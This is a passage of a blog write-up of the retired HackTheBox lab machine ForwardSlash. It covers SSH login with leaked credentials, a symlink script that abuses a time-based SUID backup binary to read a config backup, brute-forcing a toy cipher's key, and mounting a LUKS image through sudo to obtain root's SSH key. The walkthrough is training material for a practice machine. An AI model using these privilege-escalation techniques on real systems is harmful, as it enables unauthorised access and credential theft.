+</pre><td class="rouge-code"><pre><span class="k">if</span> <span class="p">(</span><span class="o">@</span><span class="nb">ftp_login</span><span class="p">(</span><span class="nv">$conn_id</span><span class="p">,</span> <span class="s2">"chiv"</span><span class="p">,</span> <span class="s1">'N0bodyL1kesBack/'</span><span class="p">))</span> <span class="p">{</span>
+</pre></table></code></div></div><p>since there is not any ftp port opened , we can conclude that the credentials are of ssh of user <code class="language-plaintext highlighter-rouge">chiv</code></p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+</pre><td class="rouge-code"><pre>➜  prashant sshpass <span class="nt">-p</span> N0bodyL1kesBack/ ssh chiv@10.10.10.183
+Welcome to Ubuntu 18.04.4 LTS <span class="o">(</span>GNU/Linux 4.15.0-91-generic x86_64<span class="o">)</span>
+
+ <span class="k">*</span> Documentation:  https://help.ubuntu.com
+ <span class="k">*</span> Management:     https://landscape.canonical.com
+ <span class="k">*</span> Support:        https://ubuntu.com/advantage
+
+  System information as of Tue Apr 21 11:30:42 UTC 2020
+
+  System load:  0.0                Processes:            164
+  Usage of /:   30.6% of 19.56GB   Users logged <span class="k">in</span>:      0
+  Memory usage: 12%                IP address <span class="k">for </span>ens33: 10.10.10.183
+  Swap usage:   0%
+
+
+ <span class="k">*</span> Canonical Livepatch is available <span class="k">for </span>installation.
+   - Reduce system reboots and improve kernel security. Activate at:
+     https://ubuntu.com/livepatch
+
+16 packages can be updated.
+0 updates are security updates.
+
+Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+
+
+Last login: Tue Apr 21 07:35:26 2020 from 10.10.14.52
+chiv@forwardslash:~<span class="nv">$ </span>
+</pre></table></code></div></div><p>And finally we are logged in as chiv.Still we dont have permissions to read the <code class="language-plaintext highlighter-rouge">user.txt</code> cause its owned by user pain.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre><span class="nt">-rw-------</span> 1 pain pain   33 Apr 21 06:08 user.txt
+</pre></table></code></div></div><h1 id="privilege-escalation-to-pain">Privilege-escalation to Pain</h1><p>Now i ran <code class="language-plaintext highlighter-rouge">LinEnum.sh</code> For Getting a way to be <code class="language-plaintext highlighter-rouge">pain</code>.And a interesting thing that i got is a <code class="language-plaintext highlighter-rouge">SUID</code> binary that is owned by <code class="language-plaintext highlighter-rouge">Pain</code></p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre><td class="rouge-code"><pre><span class="o">[</span>-] SUID files:
+<span class="nt">-r-sr-xr-x</span> 1 pain pain 13384 Mar  6 10:06 /usr/bin/backup
+</pre></table></code></div></div><p>And one more interesting thing there is a file called config.php.bak which is also owned by user pain.But dont have permission to r/w/x.</p><h2 id="analyzing-the-backup-binary">Analyzing the backup binary</h2><p>Its a custom <code class="language-plaintext highlighter-rouge">binary</code> which has following <code class="language-plaintext highlighter-rouge">output</code></p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+</pre><td class="rouge-code"><pre>chiv@forwardslash:/var/www/backup.forwardslash.htb<span class="nv">$ </span>backup
+<span class="nt">----------------------------------------------------------------------</span>
+	Pains Next-Gen Time Based Backup Viewer
+	v0.1
+	NOTE: not reading the right file yet, 
+	only works <span class="k">if </span>backup is taken <span class="k">in </span>same second
+<span class="nt">----------------------------------------------------------------------</span>
+
+Current Time: 11:56:51
+ERROR: d99c2c7f8fe2c01787f88e9974e4f1fa Does Not Exist or Is Not Accessible By Me, Exiting...
+</pre></table></code></div></div><p>The hash that its generating changes everytime and the hash is md5 i can confirm it with <code class="language-plaintext highlighter-rouge">hash-identifier</code>.</p><p>After hitting some walls i just looked at the lines</p><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+</pre><td class="rouge-code"><pre>	Pain's Next-Gen Time Based Backup Viewer
+	v0.1
+	NOTE: not reading the right file yet, 
+	only works if backup is taken in same second
+</pre></table></code></div></div><p>Its saying it is a <code class="language-plaintext highlighter-rouge">time based Backup Viewer</code> maybe the md5sum that is being generated its of the current timestamp including seconds thats why its changing everytime when you run it again.</p><p>Here i made a bash script just for checking the md5 value if it will be same.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre><td class="rouge-code"><pre><span class="nb">time</span><span class="o">=</span><span class="s2">"</span><span class="si">$(</span><span class="nb">date</span> +%H:%M:%S | <span class="nb">tr</span> <span class="nt">-d</span> <span class="s1">'\n'</span> | <span class="nb">md5sum</span> | <span class="nb">tr</span> <span class="nt">-d</span> <span class="s1">' -'</span><span class="si">)</span><span class="s2">"</span>
+<span class="nb">echo</span> <span class="nv">$time</span>
+backup
+</pre></table></code></div></div><p>And i ran it</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+</pre><td class="rouge-code"><pre>chiv@forwardslash:~<span class="nv">$ </span>./time.sh 
+834e8e2a2c83f1b3e2dbfe3929e24b34
+<span class="nt">----------------------------------------------------------------------</span>
+	Pains Next-Gen Time Based Backup Viewer
+	v0.1
+	NOTE: not reading the right file yet, 
+	only works <span class="k">if </span>backup is taken <span class="k">in </span>same second
+<span class="nt">----------------------------------------------------------------------</span>
+
+Current Time: 12:06:24
+ERROR: 834e8e2a2c83f1b3e2dbfe3929e24b34 Does Not Exist or Is Not Accessible By Me, Exiting...
+chiv@forwardslash:~<span class="nv">$ </span>
+</pre></table></code></div></div><p>Here i got the same md5 hash , but what now. Then i remember the <code class="language-plaintext highlighter-rouge">config.php.bak</code> that was stated as the old <code class="language-plaintext highlighter-rouge">config</code> file backup and from the <code class="language-plaintext highlighter-rouge">backup</code> binary we can view backup since its a <strong>backup viewer</strong>.</p><p>Here i made a bash script which will do all the <code class="language-plaintext highlighter-rouge">magic</code> stuff.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+</pre><td class="rouge-code"><pre><span class="c">#!/bin/bash</span>
+
+<span class="nb">time</span><span class="o">=</span><span class="s2">"</span><span class="si">$(</span><span class="nb">date</span> +%H:%M:%S | <span class="nb">tr</span> <span class="nt">-d</span> <span class="s1">'\n'</span> | <span class="nb">md5sum</span> | <span class="nb">tr</span> <span class="nt">-d</span> <span class="s1">' -'</span><span class="si">)</span><span class="s2">"</span>
+<span class="nb">echo</span> <span class="s2">"</span><span class="nv">$time</span><span class="s2">"</span>
+<span class="nb">ln</span> <span class="nt">-s</span> /var/backups/config.php.bak /home/chiv/<span class="nv">$time</span>
+backup
+</pre></table></code></div></div><p>This will create a <code class="language-plaintext highlighter-rouge">timestamp</code> of the current <code class="language-plaintext highlighter-rouge">time</code> and convert it to md5 . And then it will link the <code class="language-plaintext highlighter-rouge">config.php.bak</code> file with the <code class="language-plaintext highlighter-rouge">time</code> variable and then run the <code class="language-plaintext highlighter-rouge">backup</code> binary.This will show us the content of the config.php.bak file.</p><div class="language-php highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+</pre><td class="rouge-code"><pre><span class="nx">chiv</span><span class="o">@</span><span class="nx">forwardslash</span><span class="o">:~</span><span class="err">$</span> <span class="o">./</span><span class="nb">time</span><span class="o">.</span><span class="nx">sh</span> 
+<span class="mi">47771</span><span class="nx">ddc7eb2d50853a6bf5c4ab81c69</span>
+<span class="o">----------------------------------------------------------------------</span>
+	<span class="nx">Pains</span> <span class="nb">Next</span><span class="o">-</span><span class="nx">Gen</span> <span class="nb">Time</span> <span class="nx">Based</span> <span class="nx">Backup</span> <span class="nx">Viewer</span>
+	<span class="nx">v0</span><span class="o">.</span><span class="mi">1</span>
+	<span class="nx">NOTE</span><span class="o">:</span> <span class="nx">not</span> <span class="nx">reading</span> <span class="nx">the</span> <span class="nx">right</span> <span class="nb">file</span> <span class="nx">yet</span><span class="p">,</span> 
+	<span class="nx">only</span> <span class="nx">works</span> <span class="k">if</span> <span class="nx">backup</span> <span class="nx">is</span> <span class="nx">taken</span> <span class="nx">in</span> <span class="nx">same</span> <span class="nx">second</span>
+<span class="o">----------------------------------------------------------------------</span>
+
+<span class="nb">Current</span> <span class="nb">Time</span><span class="o">:</span> <span class="mi">12</span><span class="o">:</span><span class="mi">28</span><span class="o">:</span><span class="mi">58</span>
+<span class="o">&lt;?</span><span class="nx">php</span>
+<span class="cm">/* Database credentials. Assuming you are running MySQL
+server with default setting (user 'root' with no password) */</span>
+<span class="nb">define</span><span class="p">(</span><span class="s1">'DB_SERVER'</span><span class="p">,</span> <span class="s1">'localhost'</span><span class="p">);</span>
+<span class="nb">define</span><span class="p">(</span><span class="s1">'DB_USERNAME'</span><span class="p">,</span> <span class="s1">'pain'</span><span class="p">);</span>
+<span class="nb">define</span><span class="p">(</span><span class="s1">'DB_PASSWORD'</span><span class="p">,</span> <span class="s1">'db1f73a72678e857d91e71d2963a1afa9efbabb32164cc1d94dbc704'</span><span class="p">);</span>
+<span class="nb">define</span><span class="p">(</span><span class="s1">'DB_NAME'</span><span class="p">,</span> <span class="s1">'site'</span><span class="p">);</span>
+ 
+<span class="cm">/* Attempt to connect to MySQL database */</span>
+<span class="nv">$link</span> <span class="o">=</span> <span class="nb">mysqli_connect</span><span class="p">(</span><span class="nx">DB_SERVER</span><span class="p">,</span> <span class="nx">DB_USERNAME</span><span class="p">,</span> <span class="nx">DB_PASSWORD</span><span class="p">,</span> <span class="nx">DB_NAME</span><span class="p">);</span>
+ 
+<span class="c1">// Check connection</span>
+<span class="k">if</span><span class="p">(</span><span class="nv">$link</span> <span class="o">===</span> <span class="kc">false</span><span class="p">){</span>
+    <span class="k">die</span><span class="p">(</span><span class="s2">"ERROR: Could not connect. "</span> <span class="o">.</span> <span class="nx">mysqli_connect_error</span><span class="p">());</span>
+<span class="p">}</span>
+<span class="cp">?&gt;</span>
+</pre></table></code></div></div><p>And here we got the user <code class="language-plaintext highlighter-rouge">pain</code> credentials for the <code class="language-plaintext highlighter-rouge">mysql</code> datatbase.If you switch to user pain using the following password we got.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre><td class="rouge-code"><pre>chiv@forwardslash:~<span class="nv">$ </span>su - pain
+Password: 
+pain@forwardslash:~<span class="err">$</span>
+</pre></table></code></div></div><h1 id="got-usertxtforwardslash">Got user.txt@forwardslash:~$</h1><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre><td class="rouge-code"><pre>pain@forwardslash:~<span class="nv">$ </span><span class="nb">cat </span>user.txt
+dcf---------------------------a2
+pain@forwardslash:~<span class="nv">$ </span>
+</pre></table></code></div></div><h1 id="privilege-escalation-to-root">Privilege Escalation to root</h1><p>The user pain can run the following commands with sudo privileges without a password</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+</pre><td class="rouge-code"><pre>pain@forwardslash:~<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
+Matching Defaults entries <span class="k">for </span>pain on forwardslash:
+    env_reset, mail_badpass, <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin
+
+User pain may run the following commands on forwardslash:
+    <span class="o">(</span>root<span class="o">)</span> NOPASSWD: /sbin/cryptsetup luksOpen <span class="k">*</span>
+    <span class="o">(</span>root<span class="o">)</span> NOPASSWD: /bin/mount /dev/mapper/backup ./mnt/
+    <span class="o">(</span>root<span class="o">)</span> NOPASSWD: /bin/umount ./mnt/
+</pre></table></code></div></div><p><code class="language-plaintext highlighter-rouge">cryptsetup</code> is used to map the images generally of a backup images.And then we can mount the mapped images to any dir and access the files in it.</p><p>There is a python script called <code class="language-plaintext highlighter-rouge">encrypter.py</code> and and ciphertext in the dir called <code class="language-plaintext highlighter-rouge">encryptorinator</code>.</p><div class="language-python highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+</pre><td class="rouge-code"><pre><span class="k">def</span> <span class="nf">encrypt</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="n">msg</span><span class="p">):</span>
+    <span class="n">key</span> <span class="o">=</span> <span class="nb">list</span><span class="p">(</span><span class="n">key</span><span class="p">)</span>
+    <span class="n">msg</span> <span class="o">=</span> <span class="nb">list</span><span class="p">(</span><span class="n">msg</span><span class="p">)</span>
+    <span class="k">for</span> <span class="n">char_key</span> <span class="ow">in</span> <span class="n">key</span><span class="p">:</span>
+        <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">msg</span><span class="p">)):</span>
+            <span class="k">if</span> <span class="n">i</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
+                <span class="n">tmp</span> <span class="o">=</span> <span class="nb">ord</span><span class="p">(</span><span class="n">msg</span><span class="p">[</span><span class="n">i</span><span class="p">])</span> <span class="o">+</span> <span class="nb">ord</span><span class="p">(</span><span class="n">char_key</span><span class="p">)</span> <span class="o">+</span> <span class="nb">ord</span><span class="p">(</span><span class="n">msg</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">])</span>
+            <span class="k">else</span><span class="p">:</span>
+                <span class="n">tmp</span> <span class="o">=</span> <span class="nb">ord</span><span class="p">(</span><span class="n">msg</span><span class="p">[</span><span class="n">i</span><span class="p">])</span> <span class="o">+</span> <span class="nb">ord</span><span class="p">(</span><span class="n">char_key</span><span class="p">)</span> <span class="o">+</span> <span class="nb">ord</span><span class="p">(</span><span class="n">msg</span><span class="p">[</span><span class="n">i</span><span class="o">-</span><span class="mi">1</span><span class="p">])</span>
+
+            <span class="k">while</span> <span class="n">tmp</span> <span class="o">&gt;</span> <span class="mi">255</span><span class="p">:</span>
+                <span class="n">tmp</span> <span class="o">-=</span> <span class="mi">256</span>
+            <span class="n">msg</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">tmp</span><span class="p">)</span>
+    <span class="k">return</span> <span class="s">''</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="n">msg</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">decrypt</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="n">msg</span><span class="p">):</span>
+    <span class="n">key</span> <span class="o">=</span> <span class="nb">list</span><span class="p">(</span><span class="n">key</span><span class="p">)</span>
+    <span class="n">msg</span> <span class="o">=</span> <span class="nb">list</span><span class="p">(</span><span class="n">msg</span><span class="p">)</span>
+    <span class="k">for</span> <span class="n">char_key</span> <span class="ow">in</span> <span class="nb">reversed</span><span class="p">(</span><span class="n">key</span><span class="p">):</span>
+        <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">reversed</span><span class="p">(</span><span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">msg</span><span class="p">))):</span>
+            <span class="k">if</span> <span class="n">i</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
+                <span class="n">tmp</span> <span class="o">=</span> <span class="nb">ord</span><span class="p">(</span><span class="n">msg</span><span class="p">[</span><span class="n">i</span><span class="p">])</span> <span class="o">-</span> <span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">char_key</span><span class="p">)</span> <span class="o">+</span> <span class="nb">ord</span><span class="p">(</span><span class="n">msg</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">]))</span>
+            <span class="k">else</span><span class="p">:</span>
+                <span class="n">tmp</span> <span class="o">=</span> <span class="nb">ord</span><span class="p">(</span><span class="n">msg</span><span class="p">[</span><span class="n">i</span><span class="p">])</span> <span class="o">-</span> <span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">char_key</span><span class="p">)</span> <span class="o">+</span> <span class="nb">ord</span><span class="p">(</span><span class="n">msg</span><span class="p">[</span><span class="n">i</span><span class="o">-</span><span class="mi">1</span><span class="p">]))</span>
+            <span class="k">while</span> <span class="n">tmp</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">:</span>
+                <span class="n">tmp</span> <span class="o">+=</span> <span class="mi">256</span>
+            <span class="n">msg</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">tmp</span><span class="p">)</span>
+    <span class="k">return</span> <span class="s">''</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="n">msg</span><span class="p">)</span>
+
+
+<span class="k">print</span> <span class="n">encrypt</span><span class="p">(</span><span class="s">'REDACTED'</span><span class="p">,</span> <span class="s">'REDACTED'</span><span class="p">)</span>
+<span class="k">print</span> <span class="n">decrypt</span><span class="p">(</span><span class="s">'REDACTED'</span><span class="p">,</span> <span class="n">encrypt</span><span class="p">(</span><span class="s">'REDACTED'</span><span class="p">,</span> <span class="s">'REDACTED'</span><span class="p">))</span>
+</pre></table></code></div></div><p>So i just analyzed the code and i was able decrypt the ciphertext with the following script</p><div class="language-python highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+</pre><td class="rouge-code"><pre><span class="k">def</span> <span class="nf">decrypt</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="n">msg</span><span class="p">):</span>
+    <span class="n">key</span> <span class="o">=</span> <span class="nb">list</span><span class="p">(</span><span class="n">key</span><span class="p">)</span>
+    <span class="n">msg</span> <span class="o">=</span> <span class="nb">list</span><span class="p">(</span><span class="n">msg</span><span class="p">)</span>
+    <span class="k">for</span> <span class="n">char_key</span> <span class="ow">in</span> <span class="nb">reversed</span><span class="p">(</span><span class="n">key</span><span class="p">):</span>
+        <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">reversed</span><span class="p">(</span><span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">msg</span><span class="p">))):</span>
+            <span class="k">if</span> <span class="n">i</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
+                <span class="n">tmp</span> <span class="o">=</span> <span class="nb">ord</span><span class="p">(</span><span class="n">msg</span><span class="p">[</span><span class="n">i</span><span class="p">])</span> <span class="o">-</span> <span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">char_key</span><span class="p">)</span> <span class="o">+</span> <span class="nb">ord</span><span class="p">(</span><span class="n">msg</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">]))</span>
+            <span class="k">else</span><span class="p">:</span>
+                <span class="n">tmp</span> <span class="o">=</span> <span class="nb">ord</span><span class="p">(</span><span class="n">msg</span><span class="p">[</span><span class="n">i</span><span class="p">])</span> <span class="o">-</span> <span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">char_key</span><span class="p">)</span> <span class="o">+</span> <span class="nb">ord</span><span class="p">(</span><span class="n">msg</span><span class="p">[</span><span class="n">i</span><span class="o">-</span><span class="mi">1</span><span class="p">]))</span>
+            <span class="k">while</span> <span class="n">tmp</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">:</span>
+                <span class="n">tmp</span> <span class="o">+=</span> <span class="mi">256</span>
+            <span class="n">msg</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">tmp</span><span class="p">)</span>
+    <span class="k">return</span> <span class="s">''</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="n">msg</span><span class="p">)</span>
+
+<span class="n">ciphertext</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s">'ciphertext'</span><span class="p">,</span> <span class="s">'r'</span><span class="p">).</span><span class="n">read</span><span class="p">().</span><span class="n">rstrip</span><span class="p">()</span>
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">165</span><span class="p">):</span> 
+    <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">33</span><span class="p">,</span> <span class="mi">127</span><span class="p">):</span> 
+        <span class="n">key</span> <span class="o">=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">j</span><span class="p">)</span> <span class="o">*</span> <span class="n">i</span>
+        <span class="n">msg</span> <span class="o">=</span> <span class="n">decrypt</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="n">ciphertext</span><span class="p">)</span>
+        <span class="k">if</span> <span class="s">'the '</span> <span class="ow">in</span> <span class="n">msg</span> <span class="ow">or</span> <span class="s">'be '</span> <span class="ow">in</span> <span class="n">msg</span> <span class="ow">or</span> <span class="s">'and '</span> <span class="ow">in</span> <span class="n">msg</span> <span class="ow">or</span> <span class="s">'of '</span> <span class="ow">in</span> <span class="n">msg</span> <span class="p">:</span>
+        	<span class="nb">exit</span><span class="p">(</span><span class="s">"Key: {0}, Msg: {2}"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">key</span><span class="p">),</span> <span class="n">msg</span><span class="p">))</span>
+</pre></table></code></div></div><p>After running the script we got the key , and the message.</p><p>Output of the script</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre><td class="rouge-code"><pre>➜  forwardslash python2 decrypt.py 
+Key: ttttttttttttttttt, Msg: Hl��vF��<span class="p">;</span>�������&amp;you liked my new encryption tool, pretty secure huh, anyway here is the key to the encrypted image from /var/backups/recovery: cB!6%sdH8Lj^@Y<span class="k">*</span><span class="nv">$C2cf</span>
+</pre></table></code></div></div><p>And the key <code class="language-plaintext highlighter-rouge">ttttttttttttttttt</code> and as i expected there i encrypted image for /var/backups/recovery and we got a password <code class="language-plaintext highlighter-rouge">cB!6%sdH8Lj^@Y*$C2cf</code> for the images too , Now we can map the images using <code class="language-plaintext highlighter-rouge">cryptsetup</code> As we can run it with root.</p><p>Here is the <code class="language-plaintext highlighter-rouge">encrypted_backup.img</code></p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+</pre><td class="rouge-code"><pre>pain@forwardslash:/var/backups/recovery<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span>
+total 976576
+drwxrwx--- 2 root backupoperator       4096 May 27  2019 <span class="nb">.</span>
+drwxr-xr-x 3 root root                 4096 Mar 24 10:10 ..
+<span class="nt">-rw-r-----</span> 1 root backupoperator 1000000000 Apr 21 16:01 encrypted_backup.img
+</pre></table></code></div></div><p>we can map <code class="language-plaintext highlighter-rouge">encrypted_backup.img</code> with cryptsetup in /dev/mapper/backup</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre><td class="rouge-code"><pre>pain@forwardslash:~<span class="nv">$ </span><span class="nb">sudo</span> /sbin/cryptsetup luksOpen /var/backups/recovery/encrypted_backup.img backup
+Enter passphrase <span class="k">for</span> /var/backups/recovery/encrypted_backup.img: 
+pain@forwardslash:~<span class="err">$</span>
+</pre></table></code></div></div><p>Now we need to head towards <code class="language-plaintext highlighter-rouge">/dev/mapper</code>.To check for mapped images</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+</pre><td class="rouge-code"><pre>pain@forwardslash:/dev/mapper<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span>
+total 0
+drwxr-xr-x  2 root root     100 Apr 21 15:56 <span class="nb">.</span>
+drwxr-xr-x 18 root root    3940 Apr 21 15:56 ..
+lrwxrwxrwx  1 root root       7 Apr 21 15:56 backup -&gt; ../dm-1
+</pre></table></code></div></div><p>Okay so its been created now we can mount the images to <code class="language-plaintext highlighter-rouge">mnt</code> dir .</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre><td class="rouge-code"><pre>pain@forwardslash:~<span class="nv">$ </span><span class="nb">mkdir </span>mnt
+pain@forwardslash:~<span class="nv">$ </span><span class="nb">sudo</span> /bin/mount /dev/mapper/backup ./mnt/
+</pre></table></code></div></div><p>And its get mounted to <code class="language-plaintext highlighter-rouge">mnt</code> dir.</p><p>Lets Check what we got !!!!!!!1</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+</pre><td class="rouge-code"><pre>pain@forwardslash:~/mnt$ ls -la
+total 8
+drwxr-xr-x 2 root root   20 Mar 17 20:07 .
+drwxr-xr-x 8 pain pain 4096 Apr 21 16:34 ..
+-rw-r--r-- 1 root root 1675 May 27  2019 id_rsa
+</pre></table></code></div></div><p>And we got a private ssh-keys for user root</p><p>![Id_rsa]/fc3efc98-2e39-4362-a947-742f099ec8fc/image-7.png)</p><p>And i can use them to login as root</p><h1 id="got-roottxt">Got root.txt</h1><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+</pre><td class="rouge-code"><pre>➜  forwardslash ssh <span class="nt">-i</span> id_rsa root@forwardslash.htb 
+Welcome to Ubuntu 18.04.4 LTS <span class="o">(</span>GNU/Linux 4.15.0-91-generic x86_64<span class="o">)</span>
+
+ <span class="k">*</span> Documentation:  https://help.ubuntu.com
+ <span class="k">*</span> Management:     https://landscape.canonical.com
+ <span class="k">*</span> Support:        https://ubuntu.com/advantage
+
+  System information as of Tue Apr 21 16:39:39 UTC 2020
+
+  System load:  0.0                Processes:            190
+  Usage of /:   30.6% of 19.56GB   Users logged <span class="k">in</span>:      1
+  Memory usage: 11%                IP address <span class="k">for </span>ens33: 10.10.10.183
+  Swap usage:   0%
+
+
+ <span class="k">*</span> Canonical Livepatch is available <span class="k">for </span>installation.
+   - Reduce system reboots and improve kernel security. Activate at:
+     https://ubuntu.com/livepatch
+
+16 packages can be updated.
+0 updates are security updates.
+
+Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+
+
+Last login: Tue Mar 24 12:11:46 2020 from 10.10.14.3
+root@forwardslash:~# <span class="nb">cat </span>root.txt
+018---------------------------622
+root@forwardslash:~# 
+</pre></table></code></div></div><p>And we pwned it …….</p><p>If u liked the writeup.Support a Poor Student to Get the <code class="language-plaintext highlighter-rouge">OSCP-Cert</code> on <a href="https://www.buymeacoffee.com/0xprashant" target="_blank">BuymeaCoffee</a></p><blockquote><p>If you want to get notified as soon as i upload something new to my <code class="language-plaintext highlighter-rouge">blog</code> So just click on the bell icon you are seeing on the right side – &gt; and allow push <code class="language-plaintext highlighter-rouge">notification</code></p></blockquote><h1 id="resources">Resources</h1><div class="table-wrapper"><table><thead><tr><th>Topic<th>Details<tbody><tr><td>PayloadAllTheThings php Wrapper<td><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion#wrapper-phpfilter" target="_blank">PayloadAllTheThings</a></table></div></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/hackthebox/'>Hackthebox</a>, <a href='/categories/retired/'>retired</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/subdomain-enumeration/" class="post-tag no-text-decoration" >subdomain-enumeration</a> <a href="/tags/lfi/" class="post-tag no-text-decoration" >lfi</a> <a href="/tags/cryptography/" class="post-tag no-text-decoration" >Cryptography</a> <a href="/tags/cryptsetup/" class="post-tag no-text-decoration" >cryptsetup</a> <a 